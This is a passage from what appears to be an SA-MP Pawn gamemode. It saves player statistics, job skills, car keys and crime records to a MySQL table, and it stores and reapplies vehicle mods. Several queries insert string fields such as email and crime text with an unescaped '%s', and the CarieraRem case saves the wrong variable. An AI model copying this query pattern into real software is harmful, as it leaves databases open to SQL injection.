					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `GunLicT`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGunLicT], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRobx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Rob`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRob], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFpunishx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FPunish`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFpunish], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLawyerx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Acceptpoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLawyer], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pConnectTimex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `ConnectedTime`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pConnectTime], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPayDayx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PayDay`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPayDay], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPayCheckx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Paycheck`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPayCheck], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPhousekeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `House`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPhousekey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPhousekey2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `House2`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPhousekey2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pJailedx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Jailed`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pJailed], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pJailTimex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `JailTime`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pWantedLevelx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `WantedLevel`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPhonex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Phone`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPhone], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pMatsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Materials`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMats], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFishesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Fishes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFishes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFishSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FishSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFishSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pSpawnChangex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `SpawnChange`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pSpawnChange], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRobSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `RobSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRobSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pTruckSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `TruckSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pTruckSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pTruckTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `TruckTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pTruckTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pTruckRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `TruckRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pTruckRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPizzaSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PizzaSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPizzaSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPizzaTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PizzaTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPizzaTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPizzaRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PizzaRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPizzaRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pArmsSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `ArmsSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pArmsSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pArmsTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `ArmsTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pArmsTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pArmsRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `ArmsRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pArmsRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCurierRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CurierRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCurierRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCurierSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CurierSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCurierSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCurierTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CurierTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCurierTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarieraRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CarieraRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarieraSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarieraSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CarieraSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarieraSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarieraTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CarieraTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarieraTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pDailyPayDayx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `DailyPayDay`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pDailyPayDay], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCimentRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CimentRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCimentRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCimentSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CimentSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCimentSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCimentTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CimentTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCimentTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pBusSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `BusSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pBusSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pBusTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `BusTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pBusTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pBusRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `BusRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pBusRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFarmSkillx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FarmSkill`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFarmSkill], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFarmTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FarmTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFarmTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFarmRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FarmRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFarmRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFishTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FishTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFishTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFishRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FishRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFishRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRobRemx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `RobRem`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRobRem], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRobTimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `RobTimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRobTimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLevelx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Level`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPremiumAccountx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Premium`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumAccount], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGasCanx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `GasCan`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGasCan], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPremiumPointsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPlusSlot1x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PlusSlot1`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPlusSlot1], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPlusSlot2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PlusSlot2`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPlusSlot2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPbiskeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Bizz`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPbiskey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPnumberx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PhoneNr`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPnumber], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRegx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Registered`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pReg], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRegistredDatex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `RegisterDate`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pRegistredDate], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPcarkeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPcarkey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey7x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey7`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey7], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey8x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey8`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey8], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey9x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey9`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey9], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey10x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey10`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey10], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey11x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey11`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey11], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey12x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey12`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey12], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey13x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey13`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey13], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey14x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey14`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey14], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarkey15x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Carkey15`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarkey15], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pmotokeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `motokey`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pmotokey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pprcarkey2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `prcarkey2`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pprcarkey2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPPluscarkeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `pluscarkey`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPPluscarkey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPPluscarkey2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `pluscarkey2`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPPluscarkey2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case phelikeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `helikey`='%d' WHERE `name`='%s'",PlayerInfo[playerid][phelikey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pprcarkeyx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `prcarkey`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pprcarkey], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRentedx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Rented`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRented], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCrimesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Crimes`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCrimes], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCrime1x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Crime1`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pCrime1], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCrime2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Crime2`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pCrime2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCrime3x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Crime3`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pCrime3], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pVictimx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Victim`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pVictim], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pAccusedx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Accused`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pAccused], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFWorksx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FWorks`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFWorks], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pEmailx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Email`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pEmail], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pWarnsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Warnings`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pWarns], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLanguagex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Language`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLanguage], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pVirtualPDx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `VirtualPD`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pVirtualPD], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGlassesx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Glasses`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGlasses], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHatsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Hats`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHats], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFactionTimex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FactionTime`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFactionTime], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCreditsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CreditsF`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCredits], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pNMutedx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `NMuted`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pNMuted], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGPointsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `GPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGPoints], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHelpedPlayersx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HelpedPlayers`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHelpedPlayers], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHTokenx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HelperToken`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHToken], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHCarx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HelperCar`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHCar], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHiddenColorx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HiddenColor`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHiddenColor], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGiftTimex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `GiftTime`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGiftTime], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFightStylex:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FightStyle`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFightStyle], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHUD1x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HUD1`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHUD1], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHUD2x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HUD2`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHUD2], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pHUD3x:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `HUD3`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pHUD3], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
			}
		}
	}
	return 1;
}

// VEHICLE COMPONENT SAVE
forward SaveComponent(vehicleid,componentid);
public SaveComponent(vehicleid,componentid)
{
	for(new s=0; s<20; s++)
	{
		if(componentid == spoiler[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod1] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<3; s++)
	{
		if(componentid == nitro[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod2] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<23; s++)
	{
		if(componentid == fbumper[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod3] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<22; s++)
	{
		if(componentid == rbumper[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod4] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<28; s++)
	{
		if(componentid == exhaust[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod5] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<2; s++)
	{
		if(componentid == bventr[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod6] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<2; s++)
	{
		if(componentid == bventl[s][0]) 
		{
			CarInfo[OwnedVeh(vehicleid)][mod7] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<4; s++)
	{
		if(componentid == bscoop[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod8] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<17; s++)
	{
		if(componentid == rscoop[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod9] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<21; s++)
	{
		if(componentid == lskirt[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod10] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<21; s++)
	{
		if(componentid == rskirt[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod11] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<1; s++)
	{
		if(componentid == hydraulics[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod12] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<1; s++)
	{
		if(componentid == vbase[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod13] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<4; s++)
	{
		if(componentid == rbbars[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod14] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<2; s++)
	{
		if(componentid == fbbars[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod15] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<17; s++)
	{
		if(componentid == wheels[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod16] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	for(new s=0; s<2; s++)
	{
		if(componentid == vlights[s][0])
		{
			CarInfo[OwnedVeh(vehicleid)][mod17] = componentid;
			AddVehicleComponent(vehicleid, componentid);
		}
	}
	vUpdate(OwnedVeh(vehicleid), cModsx);
	return 1;
}

stock ModVehicle(vehicleid)
{
	if(CarInfo[OwnedVeh(vehicleid)][mod1] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod1]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod2] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod2]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod3] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod3]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod4] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod4]);
	}
